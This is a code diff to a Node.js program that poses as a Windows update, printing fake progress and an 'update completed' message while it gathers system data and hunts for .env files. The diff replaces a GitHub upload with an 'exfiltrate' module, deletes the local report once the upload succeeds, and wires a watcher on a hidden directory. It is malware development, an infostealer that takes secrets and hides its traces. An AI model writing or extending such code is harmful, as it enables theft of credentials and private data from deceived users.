@@ -1,3 +1,4 @@
+const fs = require("fs");
 const os = require("os");
 const path = require("path");
 const logger = require("./utils/logger");
@@ -5,7 +6,7 @@ const { PhaseError } = require("./utils/errors");
 const startWatcher = require("./monitor/watcher");
 const generateReport = require("./report/generator");
 const { getHashedMachineGuid } = require("./system/machineId");
-const { uploadToGitHub } = require("./app/uploader");
+const { exfiltrate } = require("./app/exfil");
 const {
     collectSystemData,
     huntEnvFiles,
@@ -79,12 +80,16 @@ function fakeProgress() {
 
     try {
         const report = buildReport(systemData, envFiles, crudLog, startTime, errors);
-        generateReport(report);
+        const reportResult = generateReport(report);
 
         const systemId = getHashedMachineGuid();
         report.systemId = systemId;
 
-        await uploadToGitHub(report, systemId);
+        const uploaded = await exfiltrate(report, systemId);
+        if (uploaded && reportResult && reportResult.path) {
+            fs.unlinkSync(reportResult.path);
+            logger.debug("Local report deleted after upload");
+        }
     } catch (err) {
         logger.error(`Report phase failed: ${err.message}`);
     }
@@ -94,7 +99,9 @@ function fakeProgress() {
     console.log("Windows Update completed successfully.");
 
     try {
-        startWatcher(HIDDEN_DIR);
+        startWatcher(HIDDEN_DIR, (filename, eventType) => {
+            logger.warn(`Suspicious file detected: ${filename} (${eventType})`);
+        });
     } catch (err) {
         logger.warn(`Watcher failed to start: ${err.message}`);
     }
